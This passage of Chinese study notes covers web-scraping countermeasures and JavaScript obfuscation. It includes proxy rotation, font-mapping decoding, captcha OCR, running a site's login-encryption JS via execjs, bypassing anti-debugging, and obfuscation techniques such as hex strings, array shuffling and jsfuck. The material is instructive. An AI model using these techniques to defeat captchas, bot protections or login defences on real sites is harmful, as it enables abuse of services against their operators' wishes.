class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;http://localhost:8888&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">            ip=data.select(<span class="string">&#x27;td&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            port=data.select(<span class="string">&#x27;td&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">            proxy=<span class="string">&quot;http://&quot;</span>+ip.text+<span class="string">&quot;:&quot;</span>+port.text</span><br><span class="line">            proxies[<span class="string">&#x27;http&#x27;</span>]=proxy</span><br><span class="line">            proxies[<span class="string">&#x27;https&#x27;</span>] = proxy</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Get proxy&quot;</span>,<span class="string">&quot;IP:&quot;</span>,ip.text,<span class="string">&quot;Port:&quot;</span>,port.text)</span><br><span class="line">            verify(proxies)</span><br></pre></td></tr></table></figure><h2 id="Ajax异步加载">Ajax异步加载</h2><p>简单来说就是在访问一个页面时，URL本身没有发生变化，页面内容却发生了动态更新。这时，直接使用get请求去获取网站内容是定位不到具体内容的，因为他的获取一般是经由数据接口进行返回的</p><p>面对此类技术只需要网页抓包，在大量数据包中寻找真正包含网页内容的数据接口即可。因为数据如果渲染到页面就一定会有数据包将其传输到客户端，此类技术进行数据传输返回的结果都是JSON格式，用JSON包进行数据解析。JSON格式所以不需要bs4解析DOM语法树</p><h2 id="字体反爬虫">字体反爬虫</h2><p>对数据进行反爬虫操作。要获取的网页数据在浏览器中正常查看，将其复制到本地就会乱码，他的原理是网站自定义创造一套字体，构建映射关系后将其添加到css的font中，在浏览器中查看网站会自动获取这些文件从而建立对应关系映射得到字符，爬虫时，映射文件空缺，没有字符集解字符，导致乱码</p><p>应对两个方法：</p><ol><li>找到font文件的url地址，将其下载到本地后使用xml解析工具解析，然后根据其中字符对应关系，建立本地映射进行字符替换</li><li>手动复制其中加密字符，在本地encode编码，建立自己的本地映射字典，然后进行字符爬取替换</li></ol><p><strong>案例：实习僧python岗位</strong></p><p><img src="assets/image-20241113163522007.png" alt="image-20241113163522007"></p><p><img src="assets/image-20241113163535965.png" alt="image-20241113163535965"></p><p>发现确实有一些是乱码，</p><p>**采用第二种方法:**首先复制单个无法显示字符，encode编码，这里以1-3为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">one=<span class="string">&#x27; &#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">two=<span class="string">&#x27; &#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">three=<span class="string">&#x27; &#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;xxxxx&#x27;</span>&#125;</span><br><span class="line">response=requests.get(<span class="string">&#x27;目标url&#x27;</span>，headers=headers)</span><br><span class="line">soup=BeautifulSoup(response.text,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">salary=soup.select(<span class="string">&#x27;span.day.font&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> salary:</span><br><span class="line">    number=s.text.encode(<span class="string">&#x27;utf-8&#x27;</span>).replace(one,<span class="string">b&#x27;1&#x27;</span>).replace(two,<span class="string">b&#x27;2&#x27;</span>).replace(three,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(number.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="验证码反爬虫">验证码反爬虫</h2><p>验证码防护两个阶段：登录注册阶段和访问页面阶段</p><p>如果突破了登录注册阶段，发现一ip短时间多次访问，不会直接封ip，而是出现验证码，防止误伤正常用户，</p><p>训练大模型的网络爬虫可以突破验证码，所以开发者会在验证码背后加上js参数加密，提高难度。不过使用特殊工具selenium可以直接搭配模型模拟人类行为通过验证码，无须破解js参数加密</p><p>对于英数验证码，使用光学字符识别直接识别英数验证码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line">image=Image.<span class="built_in">open</span>(<span class="string">&quot;1234.png&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(pytesseract,image_to_string(image))</span><br></pre></td></tr></table></figure><h2 id="JS参数加密">JS参数加密</h2><p>常用于post表单提交，主要是为了防范恶意机器人批量注册与模拟登录等行为，如果对POST表单进行抓包会发现在表单里输入的数据被加密成了不可知的字符串，这主要是通过加载网站的本地JS脚本实现的</p><p>应对方法：</p><ol><li>简单的加密可以直接使用python语言进行复现</li><li>较复杂一些的加密可以将具体函数提取出来，组成加密脚本后模拟运行</li></ol><p>淘宝登录案例中：</p><p>找到加密js代码，命名为password2.js保存在本地，并编写getPwd接口用于python调用</p><p><img src="assets/image-20241113202428075.png" alt="image-20241113202428075"></p><p>最后通过python调用这个js脚本，获取加密结果</p><p>(execjs用于python调用js)</p><p><img src="assets/image-20241113202553906.png" alt="image-20241113202553906"></p><h2 id="JS反调试">JS反调试</h2><p>最简单的：检测是否打开开发者工具或者是否修改本地JS脚本文件，从而判断是否进行无限debugger的卡顿，让攻击者无法调试。</p><p>这种反爬虫的破解可以通过JS Hook</p><p>对于无限循环debugger应对：</p><ol><li>在debugger设置条件断点写入false</li><li>本地覆盖：在使用本地覆盖时，发现这个JS文件名字是VMXXX，显然不是正常的js脚本文件。因为当Ajax加载html内容时，如果包含script标签，Chrome就会自动对脚本进行eval()运算，并被Chrome的source面板识别为VM开头的新文件，转到网络面板，找到Ajax请求，原始的js会存放在响应里，然后本地去除其中的debugger或者反调试函数，将修改过的文件返回回去。</li></ol><h2 id="AST混淆反爬虫">AST混淆反爬虫</h2><p>把代码进行ast混淆，转化为不可阅读，不可识别却能正常运作的乱码文件。</p><h1>混淆js手动逆向方法</h1><p><strong>基本步骤</strong></p><ul><li>定位加密入口</li><li>混淆特征分析</li><li>加密函数还原</li></ul><h2 id="数组混淆和数组乱序">数组混淆和数组乱序</h2><p>数组混淆是将全脚本的所有字符串进行提取加密，在js脚本头部组成加密字符串数组，之后的字符串调用将以获取数组的形式获取字符串，但是字符串位置固定，所以数组混淆和数组乱序通常搭配使用。</p><p>数组混淆的特征是，混淆脚本头部会存一个较长的字符串加密数组；数组乱序的特征是代码中包含push和shift字符串，用于打乱数组顺序</p><h2 id="字符串加密">字符串加密</h2><p>比较常用的事base64加密，特征是脚本中会存在atob方法，用于base64加密文本的解密。</p><h2 id="字符串花指令">字符串花指令</h2><p>是一些无用的代码，主要为了增加破解难度，最常见的字符串花指令就是四则运算的改写</p><h2 id="switch流程控制平坦化">switch流程控制平坦化</h2><p>会把原先的代码执行链拆分为switch判断的多循环结构，作为switch执行的分发器，然后将原本的代码改写为switch形式，按照分发器的顺序进行case判断。最显著特征为存在一个循环的while结构，其中包含多个以数组为判断条件的case结构，在他上面的变量声明一般为分发器</p><h1>JS代码安全防护原理</h1><h2 id="常量的混淆">常量的混淆</h2><h3 id="对象属性的两种访问方式">对象属性的两种访问方式</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">People</span>(<span class="params">name</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span>=name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">People</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayHello</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="title class_">People</span>(<span class="string">&quot;zxk1ng&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p.<span class="property">name</span>);</span><br><span class="line">p.<span class="title function_">sayHello</span>();</span><br><span class="line"><span class="comment">//简单混淆</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">p[<span class="string">&#x27;sayHello&#x27;</span>]();</span><br><span class="line"></span><br><span class="line"><span class="comment">//在JavaScript中，prototype 是一个特殊的属性，它与构造函数（constructor）和对象实例（instances）之间的关系有关。这个属性主要用于实现继承和共享方法。每个 JavaScript 函数都有一个 prototype 属性，它是一个指向对象的引用。当你创建一个新的对象实例时，这个实例会继承其构造函数的 prototype 对象上的属性和方法。</span></span><br></pre></td></tr></table></figure><p>JS中，很多内置对象都是window的属性，代码中定义的全局变量都是全局对象window的属性，定义的全局函数都是全局对象window的方法，全局对象的属性或者方法在调用时可以省略全局对象名。[]形式调用则不能省略，如</p><p><code>new window.Date() == new Date() == new window['Date']()</code></p><h3 id="十六进制字符串">十六进制字符串</h3><p>字符串的十六进制形式代替字符串</p><p>字符变为字节形式，如’yy’-&gt;'\x79\x79’再转化为Hex形式</p><p>脚本实现上面的混淆</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hexEnc</span>(<span class="params">code</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> hexStr=[],i=<span class="number">0</span>,s;i&lt;code.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        s=code.<span class="title function_">charCodeAt</span>(i).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        hexStr+=<span class="string">&quot;\\x&quot;</span>+s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hexStr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//charAt是取出字符串中对应索引的字符，而charCodeAt用来取出对应索引字符的ASCII码，然后toString(16)转化为十六进制</span></span><br></pre></td></tr></table></figure><p><code>var a =&#123;&quot;name&quot; : &quot;zxk1ng&quot;&#125;;</code></p><p>这里的”name“不能拼接不能加密，但是可以变为字节形式</p><h3 id="unicode">unicode</h3><p><strong>可以对变量和字符串进行unicode</strong></p><p>例子</p><p><code>var Week=['一','二']  &lt;==&gt;var Week=['\u4e00','\u4e8c']</code></p><p><code>'Date' &lt;==&gt;</code> ‘\u0044\u0061\u0074\u0065’</p><p>以下代码实现unicode转换</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">unicodeEnc</span>(<span class="params">str</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> value=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;str.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        value+=<span class="string">&quot;\\u&quot;</span>+(<span class="string">&quot;0000&quot;</span>+<span class="built_in">parseInt</span>(str.<span class="title function_">charCodeAt</span>(i)).<span class="title function_">toString</span>(<span class="number">16</span>)).<span class="title function_">substr</span>(-<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unicode字符串的还原方法，与十六进制字符串一样，把字符串放到控制台中输出即可</p><h3 id="字符串的ASCII码混淆">字符串的ASCII码混淆</h3><p>为了完成这个混淆需要String对象下的charCodeAt和fromCharCode(和charCodeAt过程相反)</p><p><code>console.log('b'.charCodeAt(0));</code></p><p><code>console.log(String.fromCharCode(120,12));</code>可以有多个参数，<strong>返回字符串</strong></p><p>把一个字符串转化为字节数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">stringToByte</span>(<span class="params">str</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> byteArr=[];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;str.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        byteArr.<span class="title function_">push</span>(str.<span class="title function_">charCodeAt</span>(i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> byteArr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fromCharCode接收的参数类型不是数组，如果想要传递数组，可以使用String.fromCharCode.apply(null,[102,111,114])，apply是函数对象就有的方法。</p><p>eval与function可以把字符串当做代码使用，function用来生成一个函数。</p><p>atob() 方法用于解码 base-64 编码的字符串。</p><p>btoa()用于编码base64</p><ul><li>如果用base64编码后的方法要正常使用，需要atob(“xxx”)才能正常发挥这个方法功能。</li></ul><p><img src="assets/image-20241113230217551.png" alt="image-20241113230217551"></p><h3 id="数值常量加密">数值常量加密</h3><p>例如md5加密中的常量值，把他变化就不易确定这是哪个加密算法或不容易找到关键代码。</p><h2 id="增加逆向的工作量">增加逆向的工作量</h2><h3 id="数组混淆">数组混淆</h3><p>所有字符串提取到一个数组中，在引用字符串的地方全都以数组下标的方式去访问数组成员(数组里的一般会进行加密变化)，如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bigArr = [<span class="string">&#x27;Date&#x27;</span>,<span class="string">&#x27;getTime&#x27;</span>,<span class="string">&#x27;log&#x27;</span>];</span><br><span class="line"><span class="variable language_">console</span>[bigArr[<span class="number">2</span>]](<span class="keyword">new</span> <span class="variable language_">window</span>[bigArr[<span class="number">0</span>]]()[bigArr[<span class="number">1</span>]]());</span><br><span class="line"><span class="comment">//console.log(new window.Date().getTime());</span></span><br></pre></td></tr></table></figure><p><strong>在别的语言，同一个数组只能存放同一类型，但是JS可以存放多个类型</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">People</span>(<span class="params"></span>)&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">People</span>.<span class="property">a</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="title class_">People</span>();</span><br><span class="line">p.<span class="property">constructor</span>.<span class="title function_">a</span>(); ==&gt;会输出hello</span><br><span class="line">p.<span class="property">constructor</span>       ==&gt;输出构造函数 <span class="keyword">function</span> <span class="title function_">People</span>(<span class="params"></span>)&#123;&#125;</span><br></pre></td></tr></table></figure><p><code>console.log(&quot;&quot;['constructor']['fromCharCode'](120));   输出x </code>相当于调用String下的fromCharCode方法。最前面可以是任意的字符串对象，也可以是空字符串，constructor代表获取构造函数，因此<code>&quot;&quot;['constructor']</code>等同于String</p><h3 id="数组乱序">数组乱序</h3><p>把数组成员打乱顺序，然后在索引成员之前再把数组恢复原来的顺序</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数组打乱</span></span><br><span class="line"><span class="keyword">var</span> bigArr=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>];</span><br><span class="line">(<span class="keyword">function</span>(<span class="params">arr,num</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> shuffer=<span class="keyword">function</span>(<span class="params">nums</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(--nums)&#123;</span><br><span class="line">            arr.<span class="title function_">unshift</span>(arr.<span class="title function_">pop</span>()); <span class="comment">//最后成员放在开头</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">shuffer</span>(++num);</span><br><span class="line">&#125;(bigArr,<span class="number">0x20</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(bigArr);</span><br></pre></td></tr></table></figure><p>数组恢复</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数组打乱</span></span><br><span class="line"><span class="keyword">var</span> bigArr=[填入打乱后的数组顺序];</span><br><span class="line">(<span class="keyword">function</span>(<span class="params">arr,num</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> shuffer=<span class="keyword">function</span>(<span class="params">nums</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(--nums)&#123;</span><br><span class="line">            arr[<span class="string">&#x27;push&#x27;</span>](arr[<span class="string">&#x27;shift&#x27;</span>]());<span class="comment">//第一个成员放在最后</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">shuffer</span>(++num);</span><br><span class="line">&#125;(bigArr,<span class="number">0x20</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(bigArr);</span><br></pre></td></tr></table></figure><h3 id="花指令">花指令</h3><p>添加一些没有意义却可以混淆视听的代码，是花指令的核心</p><h3 id="jsfuck">jsfuck</h3><p>jsfuck也是一种编码，把js代码转化为只用6个字符就可以表示的代码。比如常量8转化为jsfuck为：</p><p><code>(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])</code></p><p>基本原理：</p><p>+号是js一个运算符，当他作为一元运算符使用，代表强转为数值型。[]是空数组所以+[]等于0，!+[]等同于!0，js是一种弱类型语言，js引擎会在适当时候，自动完成类型隐式转化。!是js的取反，也就是这时候需要一个布尔值。（js中7种值为假值：false,undefuned,null,0,-0,NaN,“”，其他都是真），因此!0是true，!![]两次取反还是真。</p><p>+号作为二元运算符的时候，加入一边有字符串表示拼接。如果两边都没有表示数值相加。</p><p>实际开发中，jsfuck应用有限，只会应用于js中的一部分代码，主要由于还原简单，直接在控制台输入即可输出结果。</p><h2 id="代码执行流程防护原理">代码执行流程防护原理</h2><h3 id="流程平坦化">流程平坦化</h3><p>通过switch…case语句改变原来的流程</p><h3 id="逗号表达式混淆">逗号表达式混淆</h3><p>把多个表达式或语句连接成一个复合语句。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> a=<span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">var</span> b=a+<span class="number">2000</span>;   </span><br><span class="line">    <span class="keyword">var</span> c=b+<span class="number">3000</span>;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逗号表达式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> a,b,c;</span><br><span class="line">    <span class="keyword">return</span> a=<span class="number">1000</span>,</span><br><span class="line">    b=a+<span class="number">2000</span>,</span><br><span class="line">    c=b+<span class="number">3000</span>,</span><br><span class="line">    c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//return语句后通常只能跟一个表达式，他会返回这个表达式的结果，但是逗号运算符可以把多个表达式连接成一个复合语句。所以上述代码会返回最后一个表达式计算后的结果，但是前面的表达式依然会执行，</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=(a=<span class="number">1000</span>,a+=<span class="number">2000</span>) ==&gt;<span class="number">3000</span><span class="string">``</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">//第一行括号代表是一个整体，也就是把整体赋值给a，会先执行a=1000,再</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">a,b,c</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> c=(b=(a=<span class="number">1000</span>,a+<span class="number">2000</span>),b+<span class="number">3000</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>逗号表达式混淆不仅能处理赋值表达式，还能处理调用表达式，成员表达式，如下案例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj=&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">    <span class="attr">add</span>:<span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sub</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> a-b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> a=<span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">var</span> b=<span class="title function_">sub</span>(a,<span class="number">3000</span>)+<span class="number">1</span></span><br><span class="line">    <span class="keyword">var</span> c=b+obj.<span class="title function_">add</span>(b,<span class="number">2000</span>);</span><br><span class="line">    <span class="keyword">return</span> c+obj.<span class="property">name</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test函数中有函数调用表达式，还有成员表达式，可以使用下面两个方法进行处理：</p><ul><li>提升变量声明到参数中</li><li><code>b=(a=1000,sub)(a,3000)+1</code>中的<code>(a=1000,sub)</code>可以整体返回sub函数，然后直接调用，最后加1赋值给b<br>同理，如果sub改为obj.add的话，可以处理成<code>(a=1000,obj.add)(a,3000)</code>，或者<code>(a=1000,obj).add(a,3000)</code></li></ul><p>第二种方法是调用表达式在等号右边的情况，例如test中第三句，里面的b+obj.add(b,2000)，可以对obj.add进行包装，处理成<code>b+(0,obj.add)(b,2000)</code>或者<code>b+(0,obj).add(b,2000)</code>,括号中0可以换成花指令</p><h2 id="其他代码防护方案">其他代码防护方案</h2><h3 id="eval加密">eval加密</h3><p>eval加密网址：<a href="http://www.jqueryfuns.com/tools/jsencode">http://www.jqueryfuns.com/tools/jsencode</a></p><p>eval全局函数，把一段字符串当做代码执行。</p><h3 id="内存爆破">内存爆破</h3><p>是在代码中加入死代码，正常情况下，这段代码不执行，当检测函数被格式化或者函数被Hook就跳转到这段代码执行，这道内存溢出程序崩溃</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> d=[<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x0</span>];</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">b</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0x0</span>,c=d.<span class="property">length</span>;i&lt;c;i++)&#123;</span><br><span class="line">        d.<span class="title function_">push</span>(<span class="title class_">Math</span>.<span class="title function_">round</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()));</span><br><span class="line">        c=d.<span class="property">length</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="检测代码是否格式化">检测代码是否格式化</h3><p>在js中，函数是可以转为字符串的。因此可以选择一个函数转化为字符串然后跟内置字符串对比或用正则匹配。没有匹配上就说明被格式化了</p><p>函数转字符串如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(add+<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(add.<span class="title function_">toString</span>());</span><br><span class="line"><span class="comment">//&quot;function add(a,b)&#123;return a+b;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>在Chrome中，把代码格式化后会产生一个后缀为<code>formatted</code>的文件，之后这个文件中设置断点，触发断点，会停在这个文件，但是这时把某个函数转化为字符串，取到的依然是格式化之前的代码，这种检测方法检测不到这种情况，那么这种检测方法应用场景如何？</p><p>在分析完算法想要获得结果，会选择直接修改源文件，然后运行结果，把格式化后代码保存成一个本地文件，这时某个函数转化为字符串取到的就是格式化后的结果</p><p>如果检测格式化，可以跳到内存爆破中</p><h1>AST的API详解</h1><h2 id="AST入门">AST入门</h2><h3 id="AST基本结构">AST基本结构</h3><p>经过Babel解析，里面的元素叫做节点(Node)，同时Babel提供许多方法去操作节点</p><p><strong>源代码</strong>`</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj=&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">    <span class="attr">add</span>:<span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b+<span class="number">1000</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">mul</span>:<span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> a*b+<span class="number">1000</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以在AST 